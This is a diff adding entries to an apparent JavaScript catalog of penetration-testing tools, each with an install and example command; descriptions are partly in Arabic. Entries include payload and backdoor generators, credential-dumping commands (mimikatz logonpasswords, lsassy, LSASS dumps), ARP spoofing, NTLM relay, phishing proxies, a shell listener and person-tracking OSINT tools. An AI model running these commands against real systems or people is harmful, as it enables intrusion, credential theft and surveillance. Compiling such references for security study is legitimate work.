+{tool:"Shellter",category:"exploit",platform:"kali",difficulty:"advanced",desc:"حقن payloads في exe",install:"apt install shellter",command:"shellter"},
+{tool:"TheFatRat",category:"exploit",platform:"both",difficulty:"advanced",desc:"payload generator",install:"git clone https://github.com/Screetsec/TheFatRat",command:"./fatrat"},
+{tool:"Unicorn",category:"exploit",platform:"kali",difficulty:"advanced",desc:"PowerShell payloads",install:"git clone https://github.com/trustedsec/unicorn",command:"python unicorn.py windows/meterpreter/reverse_tcp"},
+{tool:"MSFPC",category:"exploit",platform:"kali",difficulty:"intermediate",desc:"MSF payload creator",install:"git clone https://github.com/g0tmi1k/msfpc",command:"./msfpc.sh"},
+{tool:"Venom",category:"exploit",platform:"kali",difficulty:"advanced",desc:"payload generator",install:"git clone https://github.com/r00t-3xp10it/venom",command:"./venom.sh"},
+{tool:"Backdoor-Factory",category:"exploit",platform:"kali",difficulty:"expert",desc:"حقن shellcode",install:"git clone https://github.com/secretsquirrel/the-backdoor-factory",command:"./backdoor.py"},
+{tool:"Ebowla",category:"exploit",platform:"kali",difficulty:"expert",desc:"payload encryption",install:"git clone https://github.com/Genetic-Malware/Ebowla",command:"python ebowla.py"},
+{tool:"GreatSCT",category:"exploit",platform:"kali",difficulty:"expert",desc:"توليد payloads مخفية",install:"git clone https://github.com/GreatSCT/GreatSCT",command:"./GreatSCT.py"},
+{tool:"Macro-Pack",category:"exploit",platform:"kali",difficulty:"advanced",desc:"Office macros",install:"git clone https://github.com/sevagas/macro_pack",command:"python macro_pack.py"},
+{tool:"LuckyStrike",category:"exploit",platform:"kali",difficulty:"advanced",desc:"Office exploitation",install:"git clone https://github.com/curi0usJack/luckystrike",command:"# يدوي"},
+{tool:"CACTUSTORCH",category:"exploit",platform:"kali",difficulty:"expert",desc:"shellcode JS/VBS",install:"git clone https://github.com/mdsecactivebreach/CACTUSTORCH",command:"# يدوي"},
+{tool:"Demiguise",category:"exploit",platform:"kali",difficulty:"expert",desc:"HTML smuggling",install:"git clone https://github.com/nccgroup/demiguise",command:"python demiguise.py"},
+{tool:"SharpShooter",category:"exploit",platform:"kali",difficulty:"expert",desc:"payload generation",install:"git clone https://github.com/mdsecactivebreach/SharpShooter",command:"python SharpShooter.py"},
+{tool:"Inveigh",category:"exploit",platform:"kali",difficulty:"expert",desc:"MITM/pwning",install:"git clone https://github.com/Kevin-Robertson/Inveigh",command:"Invoke-Inveigh"},
+{tool:"DeathStar",category:"exploit",platform:"kali",difficulty:"expert",desc:"Empire auto",install:"git clone https://github.com/byt3bl33d3r/DeathStar",command:"python DeathStar.py"},
+{tool:"Responder-Win",category:"exploit",platform:"kali",difficulty:"expert",desc:"Responder لـ Windows",install:"# من GitHub",command:"# يدوي"},
+{tool:"LDAPDomainDump",category:"exploit",platform:"both",difficulty:"advanced",desc:"LDAP dump",install:"pip install ldapdomaindump",command:"ldapdomaindump -u 'domain\\user' -p pass ldap://dc"},
+{tool:"GMSADumper",category:"exploit",platform:"kali",difficulty:"expert",desc:"GMSA passwords",install:"git clone https://github.com/micahvandeusen/gMSADumper",command:"python gMSADumper.py"},
+{tool:"Certipy",category:"exploit",platform:"both",difficulty:"expert",desc:"AD CS abuse",install:"pip install certipy-ad",command:"certipy find -u user -p pass -dc-ip DC"},
+{tool:"Rubeus-Exploit",category:"exploit",platform:"kali",difficulty:"expert",desc:"Kerberos attacks",install:"# Windows",command:"Rubeus.exe kerberoast"},
+{tool:"Kekeo",category:"exploit",platform:"kali",difficulty:"expert",desc:"Kerberos toolkit",install:"# من GitHub",command:"kekeo.exe"},
+{tool:"Mimikatz-Win",category:"exploit",platform:"kali",difficulty:"expert",desc:"Windows credential dump",install:"# Windows",command:"mimikatz.exe"},
+{tool:"SafetyKatz",category:"exploit",platform:"kali",difficulty:"expert",desc:"Mimikatz مخفي",install:"git clone https://github.com/GhostPack/SafetyKatz",command:"# compile"},
+{tool:"SharpKatz",category:"exploit",platform:"kali",difficulty:"expert",desc:".NET Mimikatz",install:"git clone https://github.com/b4rtik/SharpKatz",command:"# compile"},
+{tool:"Pypykatz",category:"exploit",platform:"both",difficulty:"expert",desc:"Mimikatz Python",install:"pip install pypykatz",command:"pypykatz lsa minidump lsass.dmp"},
+{tool:"Lsassy",category:"exploit",platform:"both",difficulty:"expert",desc:"LSASS dump remotely",install:"pip install lsassy",command:"lsassy -u user -p pass 10.0.0.1"},
+{tool:"Nanodump",category:"exploit",platform:"kali",difficulty:"expert",desc:"LSASS dump متخفي",install:"git clone https://github.com/helpsystems/nanodump",command:"# compile + run"},
+{tool:"PPLdump",category:"exploit",platform:"kali",difficulty:"expert",desc:"PPL bypass",install:"git clone https://github.com/itm4n/PPLdump",command:"PPLdump.exe"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Post-Exploitation (50 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"LinPEAS",category:"post",platform:"both",difficulty:"intermediate",desc:"اكتشاف رفع الصلاحيات Linux",install:"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",command:"chmod +x linpeas.sh && ./linpeas.sh"},
+{tool:"WinPEAS",category:"post",platform:"kali",difficulty:"intermediate",desc:"نفس الفكرة لويندوز",install:"# من GitHub",command:"winPEASx64.exe"},
+{tool:"LinEnum",category:"post",platform:"both",difficulty:"beginner",desc:"تعداد معلومات النظام",install:"git clone https://github.com/rebootuser/LinEnum",command:"./LinEnum.sh -t"},
+{tool:"pspy",category:"post",platform:"both",difficulty:"advanced",desc:"مراقبة العمليات",install:"# من GitHub",command:"./pspy64"},
+{tool:"Impacket",category:"post",platform:"both",difficulty:"advanced",desc:"بروتوكولات Windows",install:"pip install impacket",command:"impacket-psexec domain/user:pass@10.0.0.1"},
+{tool:"CrackMapExec",category:"post",platform:"kali",difficulty:"expert",desc:"أداة سويسرية",install:"pip install crackmapexec",command:"cme smb 10.0.0.0/24 -u admin -p pass"},
+{tool:"BloodHound",category:"post",platform:"kali",difficulty:"expert",desc:"تحليل AD بصرياً",install:"apt install bloodhound",command:"bloodhound"},
+{tool:"Mimikatz",category:"post",platform:"kali",difficulty:"expert",desc:"استخراج كلمات مرور",install:"# Windows",command:"mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords'"},
+{tool:"Chisel",category:"post",platform:"both",difficulty:"advanced",desc:"نفق TCP عبر HTTP",install:"go install github.com/jpillora/chisel@latest",command:"chisel server -p 8080 --reverse"},
+{tool:"Ligolo-ng",category:"post",platform:"both",difficulty:"expert",desc:"نفق عكسي حديث",install:"# من GitHub",command:"./ligolo-proxy -selfcert"},
+{tool:"GTFOBins",category:"post",platform:"both",difficulty:"intermediate",desc:"استغلال binaries",install:"# موقع",command:"# gtfobins.github.io"},
+{tool:"Linux-Exploit-Suggester",category:"post",platform:"both",difficulty:"intermediate",desc:"اقتراح استغلالات Kernel",install:"git clone https://github.com/jondonas/linux-exploit-suggester-2",command:"./linux-exploit-suggester-2.pl"},
+{tool:"Seatbelt",category:"post",platform:"kali",difficulty:"expert",desc:"تعداد أمني Windows",install:"# Windows",command:"Seatbelt.exe -group=all"},
+{tool:"Watson",category:"post",platform:"kali",difficulty:"expert",desc:"Windows privesc",install:"git clone https://github.com/rasta-mouse/Watson",command:"# compile"},
+{tool:"Sherlock",category:"post",platform:"kali",difficulty:"advanced",desc:"Windows privesc check",install:"git clone https://github.com/rasta-mouse/Sherlock",command:"# PowerShell"},
+{tool:"PowerUp",category:"post",platform:"kali",difficulty:"expert",desc:"Windows privesc",install:"git clone https://github.com/PowerShellMafia/PowerSploit",command:"Invoke-AllChecks"},
+{tool:"BeRoot",category:"post",platform:"kali",difficulty:"advanced",desc:"Privilege escalation",install:"git clone https://github.com/AlessandroZ/BeRoot",command:"beRoot.exe"},
+{tool:"Windows-Exploit-Suggester",category:"post",platform:"kali",difficulty:"advanced",desc:"Windows exploits suggester",install:"git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester",command:"python windows-exploit-suggester.py"},
+{tool:"JAWS",category:"post",platform:"kali",difficulty:"advanced",desc:"Windows enumeration",install:"git clone https://github.com/411Hall/JAWS",command:"powershell -File jaws.ps1"},
+{tool:"SharpUp",category:"post",platform:"kali",difficulty:"expert",desc:".NET PowerUp",install:"git clone https://github.com/GhostPack/SharpUp",command:"SharpUp.exe audit"},
+{tool:"Seatbelt-Net",category:"post",platform:"kali",difficulty:"expert",desc:".NET enumeration",install:"git clone https://github.com/GhostPack/Seatbelt",command:"Seatbelt.exe"},
+{tool:"Rubeus-Post",category:"post",platform:"kali",difficulty:"expert",desc:"Kerberos post-ex",install:"# Windows",command:"Rubeus.exe kerberoast"},
+{tool:"SharpHound",category:"post",platform:"kali",difficulty:"expert",desc:"BloodHound collector",install:"# Windows",command:"SharpHound.exe -c All"},
+{tool:"ADCollector",category:"post",platform:"kali",difficulty:"expert",desc:"AD enumeration",install:"# من GitHub",command:"# .NET"},
+{tool:"PowerView",category:"post",platform:"kali",difficulty:"expert",desc:"AD enumeration PowerShell",install:"# من PowerSploit",command:"Get-DomainUser"},
+{tool:"SharpView",category:"post",platform:"kali",difficulty:"expert",desc:".NET PowerView",install:"git clone https://github.com/tevora-threat/SharpView",command:"SharpView.exe Get-DomainUser"},
+{tool:"ADSearch",category:"post",platform:"kali",difficulty:"expert",desc:"AD query",install:"git clone https://github.com/tomcarver16/ADSearch",command:"ADSearch.exe"},
+{tool:"PingCastle",category:"post",platform:"kali",difficulty:"expert",desc:"AD security assessment",install:"# Windows",command:"PingCastle.exe --healthcheck"},
+{tool:"ADRecon",category:"post",platform:"kali",difficulty:"expert",desc:"AD recon",install:"git clone https://github.com/adrecon/ADRecon",command:"ADRecon.ps1"},
+{tool:"Ldapdomaindump",category:"post",platform:"both",difficulty:"advanced",desc:"LDAP dump",install:"pip install ldapdomaindump",command:"ldapdomaindump -u 'd\\u' -p p ldap://dc"},
+{tool:"Windapsearch",category:"post",platform:"both",difficulty:"advanced",desc:"LDAP queries",install:"pip install windapsearch",command:"windapsearch -d d.local -u user -p pass"},
+{tool:"GoWitness-Post",category:"post",platform:"both",difficulty:"intermediate",desc:"screenshots",install:"go install github.com/sensepost/gowitness@latest",command:"gowitness file -f urls.txt"},
+{tool:"Nuclei-Post",category:"post",platform:"both",difficulty:"advanced",desc:"فحص ثغرات",install:"pkg install nuclei",command:"nuclei -u http://t.com"},
+{tool:"Sliver-Post",category:"post",platform:"both",difficulty:"expert",desc:"C2 Sliver",install:"curl https://sliver.sh/install | sudo bash",command:"sliver"},
+{tool:"MSF-Post",category:"post",platform:"both",difficulty:"advanced",desc:"MSF modules",install:"pkg install metasploit",command:"use post/multi/gather"},
+{tool:"Sherlock-Linux",category:"post",platform:"both",difficulty:"intermediate",desc:"Linux privesc",install:"git clone https://github.com/rasta-mouse/Sherlock",command:"# يدوي"},
+{tool:"Traitor",category:"post",platform:"both",difficulty:"advanced",desc:"Linux privesc auto",install:"# من GitHub",command:"./traitor"},
+{tool:"PEASS-ng",category:"post",platform:"both",difficulty:"advanced",desc:"مجموعة PEASS",install:"git clone https://github.com/peass-ng/PEASS-ng",command:"# متضمن"},
+{tool:"GodPotato",category:"post",platform:"kali",difficulty:"expert",desc:"Windows privesc",install:"# Windows",command:"GodPotato.exe -cmd 'whoami'"},
+{tool:"JuicyPotato",category:"post",platform:"kali",difficulty:"expert",desc:"Windows token",install:"# Windows",command:"JuicyPotato.exe"},
+{tool:"RoguePotato",category:"post",platform:"kali",difficulty:"expert",desc:"Windows privesc",install:"# Windows",command:"RoguePotato.exe"},
+{tool:"PrintSpoofer",category:"post",platform:"kali",difficulty:"expert",desc:"Windows privesc",install:"# Windows",command:"PrintSpoofer.exe -i -c cmd"},
+{tool:"SweetPotato",category:"post",platform:"kali",difficulty:"expert",desc:"Windows privesc",install:"# Windows",command:"SweetPotato.exe"},
+{tool:"HollowsHunter",category:"post",platform:"kali",difficulty:"expert",desc:"كشف الـ injected code",install:"# من GitHub",command:"hollows_hunter.exe"},
+{tool:"DumpIt",category:"post",platform:"kali",difficulty:"advanced",desc:"Memory dump",install:"# Windows",command:"DumpIt.exe"},
+{tool:"WinPmem",category:"post",platform:"kali",difficulty:"advanced",desc:"Windows memory dump",install:"# من GitHub",command:"winpmem_mini_x64.exe mem.raw"},
+{tool:"Mimipenguin",category:"post",platform:"both",difficulty:"advanced",desc:"Linux credentials dump",install:"git clone https://github.com/huntergregal/mimipenguin",command:"./mimipenguin.sh"},
+{tool:"LaZagne",category:"post",platform:"both",difficulty:"advanced",desc:"استخراج credentials",install:"pip install lazagne",command:"lazagne all"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Network (50 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Ettercap",category:"network",platform:"both",difficulty:"advanced",desc:"MITM كلاسيكي",install:"pkg install ettercap",note:"Root",command:"ettercap -T -q -i eth0 -M arp:remote /gw/ /t/"},
+{tool:"Responder",category:"network",platform:"kali",difficulty:"expert",desc:"LLMNR/NBT-NS poisoning",install:"apt install responder",note:"Root",command:"responder -I eth0 -rdwv"},
+{tool:"mitmproxy",category:"network",platform:"both",difficulty:"intermediate",desc:"بروكسي HTTPS تفاعلي",install:"pip install mitmproxy",command:"mitmproxy -p 8080"},
+{tool:"tcpdump",category:"network",platform:"both",difficulty:"intermediate",desc:"التقاط حزم",install:"pkg install tcpdump",note:"Root",command:"tcpdump -i eth0 -w cap.pcap port 80"},
+{tool:"tshark",category:"network",platform:"both",difficulty:"advanced",desc:"Wireshark CLI",install:"pkg install tshark",command:"tshark -r cap.pcap -Y 'http.request'"},
+{tool:"Wireshark",category:"network",platform:"kali",difficulty:"advanced",desc:"تحليل الشبكة",install:"apt install wireshark",command:"wireshark"},
+{tool:"NTLMRelayX",category:"network",platform:"both",difficulty:"expert",desc:"إعادة توجيه NTLM",install:"pip install impacket",command:"impacket-ntlmrelayx -tf targets.txt -smb2support"},
+{tool:"Macchanger",category:"network",platform:"both",difficulty:"beginner",desc:"تغيير MAC",install:"pkg install macchanger",note:"Root",command:"macchanger -r wlan0"},
+{tool:"SSLstrip",category:"network",platform:"kali",difficulty:"advanced",desc:"تحويل HTTPS لـ HTTP",install:"apt install sslstrip",command:"sslstrip -l 8080"},
+{tool:"DNSChef",category:"network",platform:"kali",difficulty:"advanced",desc:"DNS proxy وهمي",install:"apt install dnschef",command:"dnschef --fakeip=10.0.0.1"},
+{tool:"Arpspoof",category:"network",platform:"kali",difficulty:"intermediate",desc:"ARP poisoning",install:"apt install dsniff",note:"Root",command:"arpspoof -i eth0 -t 192.168.1.5 192.168.1.1"},
+{tool:"Nmap-NSE",category:"network",platform:"both",difficulty:"intermediate",desc:"Nmap scripts",install:"pkg install nmap",command:"nmap --script=vuln <IP>"},
+{tool:"Ncat",category:"network",platform:"both",difficulty:"intermediate",desc:"Ncat من Nmap",install:"pkg install nmap",command:"ncat -lvnp 4444"},
+{tool:"Hping3-Net",category:"network",platform:"both",difficulty:"advanced",desc:"TCP packets",install:"pkg install hping3",command:"hping3 -S -p 80 -c 5 t.com"},
+{tool:"Scapy",category:"network",platform:"both",difficulty:"expert",desc:"Python packet crafting",install:"pip install scapy",command:"python -c 'from scapy.all import *'"},
+{tool:"Dsniff",category:"network",platform:"kali",difficulty:"advanced",desc:"Password sniffing",install:"apt install dsniff",command:"dsniff -i eth0"},
+{tool:"Ettercap-GTK",category:"network",platform:"kali",difficulty:"advanced",desc:"Ettercap GUI",install:"apt install ettercap-graphical",command:"ettercap -G"},
+{tool:"Bettercap-Net",category:"network",platform:"both",difficulty:"advanced",desc:"Bettercap MITM",install:"pkg install bettercap",note:"Root",command:"bettercap -iface eth0"},
+{tool:"MITMf",category:"network",platform:"kali",difficulty:"expert",desc:"MITM framework",install:"git clone https://github.com/byt3bl33d3r/MITMf",command:"python mitmf.py"},
+{tool:"Evilginx2",category:"network",platform:"both",difficulty:"expert",desc:"Reverse proxy phishing",install:"git clone https://github.com/kgretzky/evilginx2",command:"evilginx2"},
+{tool:"Modlishka",category:"network",platform:"both",difficulty:"expert",desc:"Reverse proxy",install:"git clone https://github.com/drk1wi/Modlishka",command:"modlishka -config config.json"},
+{tool:"Seth",category:"network",platform:"kali",difficulty:"expert",desc:"RDP MITM",install:"git clone https://github.com/SySS-Research/Seth",command:"python seth.py"},
+{tool:"Yersinia",category:"network",platform:"kali",difficulty:"expert",desc:"Layer 2 attacks",install:"apt install yersinia",command:"yersinia -G"},
+{tool:"Mausezahn",category:"network",platform:"kali",difficulty:"advanced",desc:"packet generator",install:"apt install mausezahn",command:"mausezahn eth0 -t tcp"},
+{tool:"Ostinato",category:"network",platform:"kali",difficulty:"advanced",desc:"packet crafting",install:"apt install ostinato",command:"ostinato"},
+{tool:"Netsniff-ng",category:"network",platform:"kali",difficulty:"advanced",desc:"network toolkit",install:"apt install netsniff-ng",command:"netsniff-ng -i eth0"},
+{tool:"Driftnet",category:"network",platform:"kali",difficulty:"intermediate",desc:"صورة من الشبكة",install:"apt install driftnet",command:"driftnet -i eth0"},
+{tool:"Urlsnarf",category:"network",platform:"kali",difficulty:"intermediate",desc:"URLs from network",install:"apt install dsniff",command:"urlsnarf -i eth0"},
+{tool:"Filesnarf",category:"network",platform:"kali",difficulty:"intermediate",desc:"files from NFS",install:"apt install dsniff",command:"filesnarf -i eth0"},
+{tool:"Mailsnarf",category:"network",platform:"kali",difficulty:"intermediate",desc:"emails from network",install:"apt install dsniff",command:"mailsnarf -i eth0"},
+{tool:"Msgsnarf",category:"network",platform:"kali",difficulty:"intermediate",desc:"instant messages",install:"apt install dsniff",command:"msgsnarf -i eth0"},
+{tool:"Webspy",category:"network",platform:"kali",difficulty:"intermediate",desc:"browsing spy",install:"apt install dsniff",command:"webspy -i eth0 1.2.3.4"},
+{tool:"Tcpflow",category:"network",platform:"both",difficulty:"intermediate",desc:"TCP streams",install:"pkg install tcpflow",command:"tcpflow -i eth0 -c"},
+{tool:"Ngrep",category:"network",platform:"both",difficulty:"intermediate",desc:"grep network",install:"pkg install ngrep",command:"ngrep -d eth0 password"},
+{tool:"P0f",category:"network",platform:"kali",difficulty:"advanced",desc:"OS fingerprinting",install:"apt install p0f",command:"p0f -i eth0"},
+{tool:"EtherApe",category:"network",platform:"kali",difficulty:"intermediate",desc:"visual network",install:"apt install etherape",command:"etherape"},
+{tool:"Iftop",category:"network",platform:"both",difficulty:"beginner",desc:"network monitor",install:"pkg install iftop",command:"iftop -i eth0"},
+{tool:"Nethogs",category:"network",platform:"both",difficulty:"beginner",desc:"per-process network",install:"pkg install nethogs",command:"nethogs"},
+{tool:"Bmon",category:"network",platform:"both",difficulty:"beginner",desc:"bandwidth monitor",install:"pkg install bmon",command:"bmon"},
+{tool:"Iperf3",category:"network",platform:"both",difficulty:"beginner",desc:"bandwidth test",install:"pkg install iperf3",command:"iperf3 -s"},
+{tool:"Ngrok",category:"network",platform:"both",difficulty:"beginner",desc:"tunnel",install:"# من ngrok.com",command:"ngrok http 8080"},
+{tool:"Chisel-Net",category:"network",platform:"both",difficulty:"advanced",desc:"TCP tunnel",install:"go install github.com/jpillora/chisel@latest",command:"chisel server -p 8080"},
+{tool:"Socat-Net",category:"network",platform:"both",difficulty:"intermediate",desc:"relay",install:"pkg install socat",command:"socat TCP-LISTEN:8080,fork TCP:target:80"},
+{tool:"Stunnel",category:"network",platform:"both",difficulty:"advanced",desc:"SSL tunnel",install:"pkg install stunnel",command:"stunnel stunnel.conf"},
+{tool:"OpenVPN",category:"network",platform:"both",difficulty:"advanced",desc:"VPN",install:"pkg install openvpn",command:"openvpn config.ovpn"},
+{tool:"WireGuard",category:"network",platform:"both",difficulty:"advanced",desc:"VPN حديث",install:"pkg install wireguard-tools",command:"wg-quick up wg0"},
+{tool:"StrongSwan",category:"network",platform:"kali",difficulty:"expert",desc:"IPsec VPN",install:"apt install strongswan",command:"ipsec up tunnel"},
+{tool:"SSHuttle",category:"network",platform:"both",difficulty:"intermediate",desc:"SSH tunnel manager",install:"pip install sshuttle",command:"sshuttle -r user@host 0.0.0.0/0"},
+{tool:"ProxyChains",category:"network",platform:"both",difficulty:"intermediate",desc:"proxy chaining",install:"pkg install proxychains-ng",command:"proxychains4 nmap -sT target"},
+{tool:"Tor",category:"network",platform:"both",difficulty:"intermediate",desc:"Tor network",install:"pkg install tor",command:"tor"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — OSINT (50 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"Sherlock-OSINT",category:"osint",platform:"both",difficulty:"beginner",desc:"username في 400+ موقع",install:"pip install sherlock-project",command:"sherlock username"},
+{tool:"Maigret",category:"osint",platform:"both",difficulty:"intermediate",desc:"بحث متقدم",install:"pip install maigret",command:"maigret username --html"},
+{tool:"Holehe",category:"osint",platform:"both",difficulty:"beginner",desc:"email في 120+ خدمة",install:"pip install holehe",command:"holehe email@t.com"},
+{tool:"Photon",category:"osint",platform:"both",difficulty:"intermediate",desc:"زاحف مواقع",install:"git clone https://github.com/s0md3v/Photon",command:"python photon.py -u http://t.com"},
+{tool:"ExifTool",category:"osint",platform:"both",difficulty:"beginner",desc:"Metadata extraction",install:"pkg install exiftool",command:"exiftool image.jpg"},
+{tool:"Metagoofil",category:"osint",platform:"both",difficulty:"intermediate",desc:"Google + Metadata",install:"pip install metagoofil",command:"metagoofil -d t.com -t pdf -l 40"},
+{tool:"Instaloader",category:"osint",platform:"both",difficulty:"beginner",desc:"Instagram scraper",install:"pip install instaloader",command:"instaloader profile username"},
+{tool:"Social-Analyzer",category:"osint",platform:"both",difficulty:"intermediate",desc:"Social media analysis",install:"pip install social-analyzer",command:"social-analyzer --username u"},
+{tool:"Blackbird",category:"osint",platform:"both",difficulty:"intermediate",desc:"username search",install:"pip install blackbird-osint",command:"blackbird -u username"},
+{tool:"Maltego",category:"osint",platform:"kali",difficulty:"expert",desc:"OSINT visualization",install:"apt install maltego",command:"maltego"},
+{tool:"SpiderFoot",category:"osint",platform:"kali",difficulty:"advanced",desc:"OSINT automation",install:"git clone https://github.com/smicallef/spiderfoot",command:"python sf.py"},
+{tool:"Recon-ng-OSINT",category:"osint",platform:"both",difficulty:"advanced",desc:"OSINT framework",install:"pip install recon-ng",command:"recon-ng"},
+{tool:"Tinfoleak",category:"osint",platform:"both",difficulty:"intermediate",desc:"Twitter analysis",install:"git clone https://github.com/vaguileradiaz/tinfoleak",command:"python tinfoleak.py"},
+{tool:"Twint",category:"osint",platform:"both",difficulty:"intermediate",desc:"Twitter scraper",install:"pip install twint",command:"twint -u username"},
+{tool:"Osintgram",category:"osint",platform:"both",difficulty:"intermediate",desc:"Instagram OSINT",install:"git clone https://github.com/Datalux/Osintgram",command:"python3 main.py username"},
+{tool:"GHunt",category:"osint",platform:"both",difficulty:"advanced",desc:"Google account OSINT",install:"pip install ghunt",command:"ghunt email@gmail.com"},
+{tool:"Mosint",category:"osint",platform:"both",difficulty:"advanced",desc:"Email OSINT",install:"git clone https://github.com/alpkeskin/mosint",command:"mosint -e email@t.com"},
+{tool:"EmailHarvester",category:"osint",platform:"both",difficulty:"intermediate",desc:"Email harvesting",install:"git clone https://github.com/maldevel/EmailHarvester",command:"python EmailHarvester.py -d t.com"},
+{tool:"Photon-OSINT",category:"osint",platform:"both",difficulty:"intermediate",desc:"Recursive scraper",install:"git clone https://github.com/s0md3v/Photon",command:"python photon.py -u http://t.com"},
+{tool:"Gh-dork",category:"osint",platform:"both",difficulty:"intermediate",desc:"GitHub dorking",install:"# يدوي",command:"# يدوي"},
+{tool:"GitFive",category:"osint",platform:"both",difficulty:"intermediate",desc:"GitHub OSINT",install:"pip install gitfive",command:"gitfive user"},
+{tool:"Nexfil",category:"osint",platform:"both",difficulty:"beginner",desc:"Username search",install:"git clone https://github.com/thewhiteh4t/nexfil",command:"python nexfil.py -u user"},
+{tool:"Phunter",category:"osint",platform:"both",difficulty:"intermediate",desc:"Phone OSINT",install:"git clone https://github.com/N0rz3/Phunter",command:"python Phunter.py"},
+{tool:"Ignorant",category:"osint",platform:"both",difficulty:"beginner",desc:"رقم هاتف في 100+ خدمة",install:"pip install ignorant",command:"ignorant +201234567890"},
+{tool:"PhoneInfoga",category:"osint",platform:"both",difficulty:"intermediate",desc:"رقم هاتف OSINT",install:"# من GitHub",command:"phoneinfoga scan -n +201234567890"},
+{tool:"H8mail",category:"osint",platform:"both",difficulty:"intermediate",desc:"Email breach lookup",install:"pip install h8mail",command:"h8mail -t email@t.com"},
+{tool:"LeakCheck",category:"osint",platform:"both",difficulty:"beginner",desc:"Breach check",install:"# موقع",command:"# leakcheck.io"},
+{tool:"Dehashed",category:"osint",platform:"both",difficulty:"intermediate",desc:"Breach database",install:"# موقع",command:"# dehashed.com"},
+{tool:"IntelligenceX",category:"osint",platform:"both",difficulty:"advanced",desc:"OSINT search engine",install:"# موقع",command:"# intelx.io"},
+{tool:"Shodan-OSINT",category:"osint",platform:"both",difficulty:"advanced",desc:"IoT search",install:"pip install shodan",command:"shodan search apache"},
+{tool:"Censys-OSINT",category:"osint",platform:"both",difficulty:"advanced",desc:"Internet scan",install:"pip install censys",command:"censys search 'services.service_name: HTTP'"},
+{tool:"Fofa",category:"osint",platform:"both",difficulty:"advanced",desc:"Cyber space search",install:"# موقع",command:"# fofa.info"},
+{tool:"ZoomEye",category:"osint",platform:"both",difficulty:"advanced",desc:"Cyberspace search",install:"# موقع",command:"# zoomeye.org"},
+{tool:"BinaryEdge",category:"osint",platform:"both",difficulty:"advanced",desc:"Internet scanning",install:"pip install binaryedge",command:"binaryedge query 'service:ssh'"},
+{tool:"GreyNoise",category:"osint",platform:"both",difficulty:"advanced",desc:"Internet noise",install:"pip install greynoise",command:"greynoise query 1.2.3.4"},
+{tool:"Urlscan",category:"osint",platform:"both",difficulty:"intermediate",desc:"URL scanning",install:"pip install urlscan-py",command:"urlscan search domain:t.com"},
+{tool:"VirusTotal-API",category:"osint",platform:"both",difficulty:"intermediate",desc:"VT queries",install:"pip install vt-py",command:"python -c 'import vt'"},
+{tool:"Waybackpack",category:"osint",platform:"both",difficulty:"intermediate",desc:"Download archive",install:"pip install waybackpack",command:"waybackpack t.com -d out/"},
+{tool:"Waymore",category:"osint",platform:"both",difficulty:"intermediate",desc:"Wayback deep",install:"pip install waymore",command:"waymore -i t.com"},
+{tool:"Archivebox",category:"osint",platform:"both",difficulty:"advanced",desc:"Self-hosted archive",install:"pip install archivebox",command:"archivebox add http://t.com"},
+{tool:"SingleFile",category:"osint",platform:"both",difficulty:"beginner",desc:"Save webpage",install:"# extension",command:"# browser"},
+{tool:"OSINT-Framework",category:"osint",platform:"both",difficulty:"beginner",desc:"موقع مرجعي",install:"# موقع",command:"# osintframework.com"},
+{tool:"IntelTechniques",category:"osint",platform:"both",difficulty:"beginner",desc:"OSINT tools",install:"# موقع",command:"# inteltechniques.com"},
+{tool:"Bellingcat-Tools",category:"osint",platform:"both",difficulty:"advanced",desc:"OSINT toolkit",install:"# موقع",command:"# bellingcat.com"},
+{tool:"UserSearch",category:"osint",platform:"both",difficulty:"beginner",desc:"Username search",install:"# موقع",command:"# usersearch.org"},
+{tool:"Whatsmyname",category:"osint",platform:"both",difficulty:"beginner",desc:"Username checker",install:"# موقع",command:"# whatsmyname.app"},
+{tool:"Namechk",category:"osint",platform:"both",difficulty:"beginner",desc:"Domain/username check",install:"# موقع",command:"# namechk.com"},
+{tool:"Pimeyes",category:"osint",platform:"both",difficulty:"intermediate",desc:"Face search",install:"# موقع",command:"# pimeyes.com"},
+{tool:"Yandex-Images",category:"osint",platform:"both",difficulty:"beginner",desc:"Reverse image",install:"# موقع",command:"# yandex.com/images"},
+{tool:"Google-Dorks-OSINT",category:"osint",platform:"both",difficulty:"intermediate",desc:"Google dorks",install:"# يدوي",command:"site:t.com filetype:pdf"},
+
+// ═══════════════════════════════════════════════════════
+// TOOLS — Crypto (25 أداة)
+// ═══════════════════════════════════════════════════════
+{tool:"OpenSSL",category:"crypto",platform:"both",difficulty:"intermediate",desc:"تشفير شامل",install:"pkg install openssl",command:"openssl s_client -connect t.com:443"},
+{tool:"Steghide",category:"crypto",platform:"both",difficulty:"intermediate",desc:"إخفاء في JPEG",install:"pkg install steghide",command:"steghide extract -sf image.jpg"},
+{tool:"zsteg",category:"crypto",platform:"both",difficulty:"intermediate",desc:"PNG/BMP stego",install:"gem install zsteg",command:"zsteg image.png"},
+{tool:"Stegseek",category:"crypto",platform:"both",difficulty:"advanced",desc:"سرع steghide",install:"apt install stegseek",command:"stegseek image.jpg rockyou.txt"},
+{tool:"Binwalk",category:"crypto",platform:"both",difficulty:"intermediate",desc:"تحليل صور/فيرموير",install:"pkg install binwalk",command:"binwalk -e firmware.bin"},
+{tool:"CyberChef",category:"crypto",platform:"both",difficulty:"beginner",desc:"محلل بيانات ويب",install:"# موقع",command:"# cyberchef.org"},
+{tool:"Hashid-Crypto",category:"crypto",platform:"both",difficulty:"beginner",desc:"تحديد hash",install:"pip install hashid",command:"hashid 'hash'"},
+{tool:"Hashcat-Crypto",category:"crypto",platform:"kali",difficulty:"advanced",desc:"كسر hashes",install:"apt install hashcat",command:"hashcat -m 0 -a 0 h.txt d.txt"},
+{tool:"John-Crypto",category:"crypto",platform:"both",difficulty:"intermediate",desc:"John",install:"pkg install john",command:"john --wordlist=d.txt h.txt"},
+{tool:"Gpg",category:"crypto",platform:"both",difficulty:"intermediate",desc:"GPG encryption",install:"pkg install gnupg",command:"gpg --gen-key"},
+{tool:"Veracrypt",category:"crypto",platform:"kali",difficulty:"intermediate",desc:"Disk encryption",install:"apt install veracrypt",command:"veracrypt"},
